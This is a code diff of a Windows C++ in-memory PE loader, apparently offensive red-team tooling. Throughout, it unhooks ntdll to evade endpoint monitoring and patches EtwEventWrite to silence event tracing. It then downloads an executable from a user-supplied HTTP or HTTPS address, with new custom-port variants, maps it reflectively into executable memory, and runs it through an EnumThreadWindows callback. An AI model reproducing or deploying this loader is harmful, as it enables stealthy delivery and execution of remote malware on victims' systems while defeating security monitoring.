@@ -1,4 +1,7 @@
-﻿#include <Windows.h>
+//credits : @aplyc1a/PEMemoryLoader
+//          @sektor7
+#include <WinSock2.h>
+#include <Windows.h>
 #include <stdio.h>
 #include <winhttp.h>
 #include <vector>
@@ -9,6 +12,9 @@
 #include <string.h>
 #include <metahost.h> 
 #include <evntprov.h>
+
+#pragma warning (disable: 4996)
+#pragma comment(lib,"WS2_32.lib")
 
 #define PATH MAX_PATH
 
@@ -96,7 +102,7 @@ static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
 
 //  try to locate the address of EtwEventWrite function from ntdll.dll module
 // nothing get logged using this function.
-int DisableETW(void) {
+void DisableETW(void) {
     DWORD oldprotect = 0;
 
     unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
@@ -115,67 +121,6 @@ int DisableETW(void) {
 
     VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
     FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
-    return 0;
-}
-
-
-int SummonCLR(void) {
-    HRESULT hr;
-    ICLRMetaHost* pMetaHost = NULL;
-    IEnumUnknown* installedRuntimes = NULL;
-    ICLRRuntimeInfo* runtimeInfo = NULL;
-    ICLRRuntimeHost* runtimeHost = NULL;
-    ULONG fetched = 0;
-
-    //wprintf(L"[+] Now Loading CLR...\n");
-
-    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
-    if (hr != S_OK) {
-        //wprintf(L"[!] Error: CLRCreateInstance...\n");
-        goto Cleanup;
-    }
-
-    hr = pMetaHost->EnumerateInstalledRuntimes(&installedRuntimes);
-    if (hr != S_OK) {
-        //wprintf(L"[!] Error: EnumerateInstalledRuntimes...\n");
-        goto Cleanup;
-    }
-
-    WCHAR versionString[20];
-    while ((hr = installedRuntimes->Next(1, (IUnknown**)&runtimeInfo, &fetched)) == S_OK && fetched > 0) {
-        DWORD versionStringSize = 20;
-        hr = runtimeInfo->GetVersionString(versionString, &versionStringSize);
-
-        if (runtimeInfo != NULL) {
-            //wprintf(L"[+] Supported Framework: %s\n", versionString);
-        }
-
-        if (versionStringSize >= 2 && versionString[1] == '4') {	// Look for .NET 4.0 runtime.
-            //wprintf(L"[+] Using runtime: %s\n", versionString);
-            break;
-        }
-    }
-
-    hr = runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (void**)&runtimeHost);
-    if (hr != S_OK) {
-        wprintf(L"[!] Error: GetInterface(CLSID_CLRRuntimeHost...) failed...\n");
-        goto Cleanup;
-    }
-
-    hr = runtimeHost->Start();
-    if (hr != S_OK) {
-        wprintf(L"[!] Error: Start runtimeHost failed...\n");
-        goto Cleanup;
-    }
-
-Cleanup:
-
-    if (pMetaHost) {
-        pMetaHost->Release();
-        pMetaHost = NULL;
-    }
-
-    return 0;
 }
 
 
@@ -290,71 +235,232 @@ bool RepairIAT(PVOID modulePtr)
     return true;
 }
 
-
-void PELoader(char* data, const long long datasize)
+BYTE* getNtHdrs(BYTE* pe_buffer)
 {
-    //char* arguments = (char*)"aaaaaaa";
-    unsigned int chksum = 0;
-    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; };
+    if (pe_buffer == NULL) return NULL;
 
+    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
+    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
+        return NULL;
+    }
+    const LONG kMaxOffset = 1024;
+    LONG pe_offset = idh->e_lfanew;
+    if (pe_offset > kMaxOffset) return NULL;
+    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((BYTE*)pe_buffer + pe_offset);
+    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
+    return (BYTE*)inh;
+}
+
+
+IMAGE_DATA_DIRECTORY* getPeDir(PVOID pe_buffer, size_t dir_id)
+{
+    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;
+
+    BYTE* nt_headers = getNtHdrs((BYTE*)pe_buffer);
+    if (nt_headers == NULL) return NULL;
+
+    IMAGE_DATA_DIRECTORY* peDir = NULL;
+
+    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
+    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);
+
+    if (peDir->VirtualAddress == NULL) {
+        return NULL;
+    }
+    return peDir;
+}
+
+
+bool fixIAT(PVOID modulePtr)
+{
+    printf("[+] Fix Import Address Table\n");
+    IMAGE_DATA_DIRECTORY* importsDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
+    if (importsDir == NULL) return false;
+
+    size_t maxSize = importsDir->Size;
+    size_t impAddr = importsDir->VirtualAddress;
+
+    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
+    size_t parsedSize = 0;
+
+    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
+        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);
+
+        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
+        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
+        printf("    [+] Import DLL: %s\n", lib_name);
+
+        size_t call_via = lib_desc->FirstThunk;
+        size_t thunk_addr = lib_desc->OriginalFirstThunk;
+        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;
+
+        size_t offsetField = 0;
+        size_t offsetThunk = 0;
+        while (true)
+        {
+            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
+            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);
+
+            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
+            {
+                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
+                printf("        [V] API %x at %x\n", orginThunk->u1.Ordinal, addr);
+                fieldThunk->u1.Function = addr;
+            }
+
+            if (fieldThunk->u1.Function == NULL) break;
+
+            if (fieldThunk->u1.Function == orginThunk->u1.Function) {
+
+                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)(size_t(modulePtr) + orginThunk->u1.AddressOfData);
+
+                LPSTR func_name = (LPSTR)by_name->Name;
+                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
+                printf("        [V] API %s at %x\n", func_name, addr);
+
+                if (hijackCmdline && strcmpi(func_name, "GetCommandLineA") == 0)
+                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
+                else if (hijackCmdline && strcmpi(func_name, "GetCommandLineW") == 0)
+                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
+                else if (hijackCmdline && strcmpi(func_name, "__wgetmainargs") == 0)
+                    fieldThunk->u1.Function = (size_t)__wgetmainargs;
+                else if (hijackCmdline && strcmpi(func_name, "__getmainargs") == 0)
+                    fieldThunk->u1.Function = (size_t)__getmainargs;
+                else
+                    fieldThunk->u1.Function = addr;
+
+            }
+            offsetField += sizeof(IMAGE_THUNK_DATA);
+            offsetThunk += sizeof(IMAGE_THUNK_DATA);
+        }
+    }
+    return true;
+}
+
+
+
+typedef struct _BASE_RELOCATION_ENTRY {
+    WORD Offset : 12;
+    WORD Type : 4;
+} BASE_RELOCATION_ENTRY;
+
+#define RELOC_32BIT_FIELD 3
+
+bool applyReloc(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr, SIZE_T moduleSize)
+{
+    IMAGE_DATA_DIRECTORY* relocDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
+    if (relocDir == NULL) /* Cannot relocate - application have no relocation table */
+        return false;
+
+    size_t maxSize = relocDir->Size;
+    size_t relocAddr = relocDir->VirtualAddress;
+    IMAGE_BASE_RELOCATION* reloc = NULL;
+
+    size_t parsedSize = 0;
+    for (; parsedSize < maxSize; parsedSize += reloc->SizeOfBlock) {
+        reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + size_t(modulePtr));
+        if (reloc->VirtualAddress == NULL || reloc->SizeOfBlock == 0)
+            break;
+
+        size_t entriesNum = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
+        size_t page = reloc->VirtualAddress;
+
+        BASE_RELOCATION_ENTRY* entry = (BASE_RELOCATION_ENTRY*)(size_t(reloc) + sizeof(IMAGE_BASE_RELOCATION));
+        for (size_t i = 0; i < entriesNum; i++) {
+            size_t offset = entry->Offset;
+            size_t type = entry->Type;
+            size_t reloc_field = page + offset;
+            if (entry == NULL || type == 0)
+                break;
+            if (type != RELOC_32BIT_FIELD) {
+                printf("    [!] Not supported relocations format at %d: %d\n", (int)i, (int)type);
+                return false;
+            }
+            if (reloc_field >= moduleSize) {
+                printf("    [-] Out of Bound Field: %lx\n", reloc_field);
+                return false;
+            }
+
+            size_t* relocateAddr = (size_t*)(size_t(modulePtr) + reloc_field);
+            printf("    [V] Apply Reloc Field at %x\n", relocateAddr);
+            (*relocateAddr) = ((*relocateAddr) - oldBase + newBase);
+            entry = (BASE_RELOCATION_ENTRY*)(size_t(entry) + sizeof(BASE_RELOCATION_ENTRY));
+        }
+    }
+    return (parsedSize != 0);
+}
+
+bool peLoader(BYTE* data)
+{
+    LONGLONG fileSize = -1;
+    // BYTE* data = MapFileToMemory(exePath, fileSize);
     BYTE* pImageBase = NULL;
     LPVOID preferAddr = 0;
-
-    //printf("  -- 1 GET NT Header\n");
-    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
-    if (!ntHeader) {
-        printf("[error] Invaild PE.\n");
-        exit(0);
+    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)getNtHdrs(data);
+    if (!ntHeader)
+    {
+       
+        return false;
     }
 
-    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
+    IMAGE_DATA_DIRECTORY* relocDir = getPeDir(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
     preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
+    printf("[+] Exe File Prefer Image Base at %x\n", preferAddr);
 
-
-    //printf("  -- 2 GET API NtUnmapViewOfSection from ntdll.dll\n");
     HMODULE dll = LoadLibraryA("ntdll.dll");
     ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
 
-    //printf("  -- 3 VirtualAlloc Memory\n");
     pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!pImageBase) {
-        if (!relocDir) {
-            exit(0);
-        }
-        else {
-            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (!pImageBase)
-            {
-                exit(0);
-            }
+    if (!pImageBase && !relocDir)
+    {
+        printf("[-] Allocate Image Base At %x Failure.\n", preferAddr);
+        return false;
+    }
+    if (!pImageBase && relocDir)
+    {
+        printf("[+] Try to Allocate Memory for New Image Base\n");
+        pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!pImageBase)
+        {
+            printf("[-] Allocate Memory For Image Base Failure.\n");
+            return false;
         }
     }
 
-    //printf("  -- 4 FILL the memory block with PEdata\n");
+    puts("[+] Mapping Section ...");
     ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
     memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
 
     IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
     for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
     {
-        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
+        printf("    [+] Mapping Section %s\n", SectionHeaderArr[i].Name);
+        memcpy
+        (
+            LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress),
+            LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData),
+            SectionHeaderArr[i].SizeOfRawData
+        );
     }
 
-    //printf("  -- 5 Fix the PE Import addr table (pImageBase:%p)\n", pImageBase);
-    RepairIAT(pImageBase);
+    // for demo usage: 
+    // masqueradeCmdline(L"C:\\Windows\\RunPE_In_Memory.exe Demo by aaaddress1");
+    // masqueradeCmdline(cmdline);
+    fixIAT(pImageBase);
 
-    //printf("  -- 6 Seek the AddressOfEntryPoint\n");
+    if (pImageBase != preferAddr)
+        if (applyReloc((size_t)pImageBase, (size_t)preferAddr, pImageBase, ntHeader->OptionalHeader.SizeOfImage))
+            puts("[+] Relocation Fixed.");
     size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
-    //printf("  -- 7 Rush the PE in Memory (size %ld)(addr %p)(chksum %ud)\n", datasize, retAddr, chksum);
-    // No New Thread :
-    //((void(*)())retAddr)(); // bad
-    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
+    printf("Run Exe Module: \n");
 
-    // create new thread mablanch:
-    //printf("this is argument : %s\n", arguments); 
-    //HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)retAddr, 0, 0, 0);
-    //WaitForSingleObject(hThread, INFINITE); 
+    // ((void(*)())retAddr)();
+    
+    // EnumWindows((WNDENUMPROC)retAddr, 0);
+
+    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
 }
+
 
 
 void NewNtdllPatchETW() {
@@ -419,17 +525,14 @@ void NewNtdllPatchETW() {
 
     DisableETW();
 
-    LoadLibraryA("clr.dll");
-    SummonCLR();
-
     //printf("After disabling ETW\n");
 }
 
 
 // 
-char* GetPE(LPCWSTR domain, LPCWSTR path) {
-    
-    
+char* GetPE443(LPCWSTR domain, LPCWSTR path) {
+
+
     std::vector<unsigned char> PEbuf;
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
@@ -447,7 +550,7 @@ char* GetPE(LPCWSTR domain, LPCWSTR path) {
     // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
     // Specify an HTTP server.
     if (hSession)
-        hConnect = WinHttpConnect(hSession,domain ,
+        hConnect = WinHttpConnect(hSession, domain,
             INTERNET_DEFAULT_HTTPS_PORT, 0);
 
     // Create an HTTP request handle.
@@ -526,39 +629,457 @@ char* GetPE(LPCWSTR domain, LPCWSTR path) {
             PE[i] = PEbuf[i];
         }
         return PE;
-        
+
 }
 
 
-int main() {
-    
+char* GetPE_HTTPSport(LPCWSTR domain, LPCWSTR path, DWORD port) {
+
+
+    std::vector<unsigned char> PEbuf;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    BOOL  bResults = FALSE;
+    HINTERNET  hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect(hSession, domain,
+            port, 0);
+
+    // Create an HTTP request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
+            NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            WINHTTP_FLAG_SECURE);
+
+    // Send a request.
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS,
+            0, WINHTTP_NO_REQUEST_DATA, 0,
+            0, 0);
+
+
+    // End the request.
+    if (bResults)
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+
+    // Keep checking for data until there is nothing left.
+    if (bResults)
+        do
+        {
+            // Check for available data.
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
+
+            // Allocate space for the buffer.
+            pszOutBuffer = new char[dwSize + 1];
+            if (!pszOutBuffer)
+            {
+                printf("Out of memory\n");
+                dwSize = 0;
+            }
+            else
+            {
+                // Read the Data.
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                    dwSize, &dwDownloaded))
+                    printf("Error %u in WinHttpReadData.\n", GetLastError());
+                else {
+                    //printf("%s\n", pszOutBuffer);
+                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
+                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
+                }
+
+                // Free the memory allocated to the buffer.
+                delete[] pszOutBuffer;
+            }
+
+        } while (dwSize > 0);
+
+        if (PEbuf.empty() == TRUE)
+        {
+            printf("Failed in retrieving the PE");
+        }
+
+
+        // Report any errors.
+        if (!bResults)
+            printf("Error %d has occurred.\n", GetLastError());
+
+        // Close any open handles.
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+
+        size_t size = PEbuf.size();
+        char* PE = (char*)malloc(size);
+        for (int i = 0; i < PEbuf.size(); i++) {
+            PE[i] = PEbuf[i];
+        }
+        return PE;
+
+}
+
+char* GetPE80(LPCWSTR domain, LPCWSTR path) {
+
+
+    std::vector<unsigned char> PEbuf;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    BOOL  bResults = FALSE;
+    HINTERNET  hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect(hSession, domain,
+            INTERNET_DEFAULT_HTTP_PORT, 0);
+    else
+        printf("Failed in WinHttpConnect (%u)\n", GetLastError());
+
+    // Create an HTTP request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
+            NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            NULL);
+    else
+        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());
+
+    // Send a request.
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS,
+            0, WINHTTP_NO_REQUEST_DATA, 0,
+            0, 0);
+    else
+        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());
+
+    // End the request.
+    if (bResults)
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());
+
+    // Keep checking for data until there is nothing left.
+    if (bResults)
+        do
+        {
+            // Check for available data.
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());
+
+            // Allocate space for the buffer.
+            pszOutBuffer = new char[dwSize + 1];
+            if (!pszOutBuffer)
+            {
+                printf("Out of memory\n");
+                dwSize = 0;
+            }
+            else
+            {
+                // Read the Data.
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                    dwSize, &dwDownloaded))
+                    printf("Error %u in WinHttpReadData.\n", GetLastError());
+                else {
+                    //printf("%s\n", pszOutBuffer);
+                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
+                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
+                }
+
+                // Free the memory allocated to the buffer.
+                delete[] pszOutBuffer;
+            }
+
+        } while (dwSize > 0);
+
+        if (PEbuf.empty() == TRUE)
+        {
+            printf("Failed in retrieving the PE\n");
+        }
+
+
+        // Report any errors.
+        if (!bResults)
+            printf("Error %d has occurred.\n", GetLastError());
+
+        // Close any open handles.
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+
+        size_t size = PEbuf.size();
+        char* PE = (char*)malloc(size);
+        for (int i = 0; i < PEbuf.size(); i++) {
+            PE[i] = PEbuf[i];
+        }
+        return PE;
+
+}
+
+char* GetPE_HTTPport(LPCWSTR domain, LPCWSTR path, DWORD port) {
+
+
+    std::vector<unsigned char> PEbuf;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    LPSTR pszOutBuffer;
+    BOOL  bResults = FALSE;
+    HINTERNET  hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect(hSession, domain,
+            port, 0);
+    else
+        printf("Failed in WinHttpConnect (%u)\n", GetLastError());
+
+    // Create an HTTP request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
+            NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            NULL);
+    else
+        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());
+
+    // Send a request.
+    if (hRequest)
+        bResults = WinHttpSendRequest(hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS,
+            0, WINHTTP_NO_REQUEST_DATA, 0,
+            0, 0);
+    else
+        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());
+
+    // End the request.
+    if (bResults)
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());
+
+    // Keep checking for data until there is nothing left.
+    if (bResults)
+        do
+        {
+            // Check for available data.
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
+                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());
+
+            // Allocate space for the buffer.
+            pszOutBuffer = new char[dwSize + 1];
+            if (!pszOutBuffer)
+            {
+                printf("Out of memory\n");
+                dwSize = 0;
+            }
+            else
+            {
+                // Read the Data.
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
+                    dwSize, &dwDownloaded))
+                    printf("Error %u in WinHttpReadData.\n", GetLastError());
+                else {
+                    //printf("%s\n", pszOutBuffer);
+                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
+                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
+                }
+
+                // Free the memory allocated to the buffer.
+                delete[] pszOutBuffer;
+            }
+
+        } while (dwSize > 0);
+
+        if (PEbuf.empty() == TRUE)
+        {
+            printf("Failed in retrieving the PE\n");
+        }
+
+
+        // Report any errors.
+        if (!bResults)
+            printf("Error %d has occurred.\n", GetLastError());
+
+        // Close any open handles.
+        if (hRequest) WinHttpCloseHandle(hRequest);
+        if (hConnect) WinHttpCloseHandle(hConnect);
+        if (hSession) WinHttpCloseHandle(hSession);
+
+        size_t size = PEbuf.size();
+        char* PE = (char*)malloc(size);
+        for (int i = 0; i < PEbuf.size(); i++) {
+            PE[i] = PEbuf[i];
+        }
+        return PE;
+
+}
+
+
+int main(int argc, char** argv) {
+
+
     printf("\n[+] Unhooking\n");
     printf("\n[+] Patch ETW \n");
     NewNtdllPatchETW();
 
-    
+
 
     printf("\n[+] Enter the uri :\n");
     char uri[250] = "";
     char argument[100] = "";
     scanf("%s", uri);
+    char* PE = NULL;
 
-    printf("\n[+] Loading Remote PE from %s\n",uri);
-    char domain[50];
-    char path[500];
-    sscanf(uri, "https://%31[^/]/%63[^\n]", domain, path);
+    if (!strncmp("https:", uri, 6)) {
+        printf("\n[+] Loading Remote PE from %s\n", uri);
+        char domain[50];
+        char path[500];
+        sscanf(uri, "https://%31[^/]/%63[^\n]", domain, path);
 
-    wchar_t Wdomain[50];
-    mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
-    wchar_t Wpath[500];
-    mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
+        wchar_t Wdomain[50];
+        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
+        wchar_t Wpath[500];
+        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
 
-    char* PE = GetPE(Wdomain, Wpath);
-    size_t size = sizeof(PE);
-    printf("\n[+] Size of the PE : %d Bytes\n", size);
-   
+        const char* invalid_characters = ":";
+        char* mystring = domain;
+        char* c = domain;
+        int j = 0;
+        while (*c)
+        {
+            if (strchr(invalid_characters, *c))
+            {
+                int i = 0;
+                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
+                char realDomain[16] = "";
+                char strPort[10] = "";
+                DWORD port;
+                for (i = 0; i < j; i++) {
+                    realDomain[i] = domain[i];
+                }
+                //printf("realDomain : %s\n", realDomain);
+                j++;
+                for (i = j; i < sizeof(domain); i++) {
+                    strPort[i - j] = domain[i];
+                }
+                //printf("strPort  %s\n", strPort);
+
+                wchar_t WrealDomain[50];
+                mbstowcs(WrealDomain, realDomain, strlen(realDomain) + 1);//Plus null
+                //printf("WrealDomain %ws\n", WrealDomain);
+
+                port = atoi(strPort);
+
+                //printf("Wpath %ws\n", Wpath);
+                //printf("WrealDomain %ws\n", WrealDomain);
+                //printf("port %d\n", port);
+                PE = GetPE_HTTPSport(WrealDomain, Wpath, port);
+
+                goto jump;
+            }
+            j++;
+            c++;
+        }
+        //printf("Wdomain : %ws\n",Wdomain);
+        PE = GetPE443(Wdomain, Wpath);
+    }
+    else if (!strncmp(uri, "http:", 5)) {
+        printf("\n[+] Loading Remote PE from %s\n", uri);
+        char domain[50];
+        char path[500];
+        sscanf(uri, "http://%31[^/]/%63[^\n]", domain, path);
+
+        wchar_t Wdomain[50];
+        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
+        wchar_t Wpath[500];
+        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
+
+        const char* invalid_characters = ":";
+        char* c = domain;
+        int j = 0;
+        while (*c)
+        {
+            if (strchr(invalid_characters, *c))
+            {
+                int i = 0;
+                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
+                char realDomain[16] = "";
+                char strPort[10] = "";
+                DWORD port;
+                for (i = 0; i < j; i++) {
+                    realDomain[i] = domain[i];
+                }
+                //printf("realDomain : %s\n", realDomain);
+                j++;
+                for (i = j; i < sizeof(domain); i++) {
+                    strPort[i - j] = domain[i];
+                }
+                //printf("strPort  %s\n", strPort);
+
+                wchar_t WrealDomain[50];
+                mbstowcs(WrealDomain, realDomain, strlen(realDomain) + 1);//Plus null
+                //printf("WrealDomain %ws\n", WrealDomain);
+
+                port = atoi(strPort);
+
+                //printf("Wpath %ws\n", Wpath);
+                //printf("WrealDomain %ws\n", WrealDomain);
+                //printf("port %d\n", port);
+                PE = GetPE_HTTPport(WrealDomain, Wpath, port);
+
+                goto jump;
+            }
+            j++;
+            c++;
+        }
+
+        //printf("Wdomain : %ws\n",Wdomain);
+        //printf("Wpath   : %ws\n", Wpath);
+        PE = GetPE80(Wdomain, Wpath);
+
+
+    }
+
+jump:
     printf("\n[+] Run PE\n\n\n");
-    PELoader(PE, size);
-    
+    peLoader((BYTE*)PE);
+
     return 0;
 }
